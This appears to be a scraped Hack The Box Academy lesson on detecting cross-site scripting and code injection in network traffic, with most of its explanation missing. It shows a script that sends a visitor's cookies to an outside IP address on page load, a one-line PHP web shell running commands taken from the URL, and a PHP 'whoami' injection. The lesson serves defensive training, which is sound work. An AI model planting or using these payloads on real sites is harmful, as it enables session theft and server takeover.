<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/229/section/2465
// Platform Version: V1
// Module ID: 229
// Module Name: Intermediate Network Traffic Analysis
// Module Difficulty: Easy
// Section ID: 2465
// Section Title: Cross-Site Scripting (XSS) & Code Injection Detection
// Page Title: Hack The Box - Academy
// Page Number: 14
-->

# Cross-Site Scripting (XSS) & Code Injection Detection

**Module Name:** Intermediate Network Traffic Analysis **Page Number:** 14

#### 

#### INTERMEDIATE NETWORK TRAFFIC ANALYSIS

# Cross-Site Scripting (XSS) & Code Injection Detection

![https://academy.hackthebox.com/storage/modules/229/1-XSS.png](https://academy.hackthebox.com/storage/modules/229/1-XSS.png)

![https://academy.hackthebox.com/storage/modules/229/2-XSS_.png](https://academy.hackthebox.com/storage/modules/229/2-XSS_.png)

``` javascript
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

``` php
<?php system($_GET['cmd']); ?>
```

``` php
<?php echo `whoami` ?>
```

#### Preventing XSS and Code Injection

# 

# 

#### Questions

####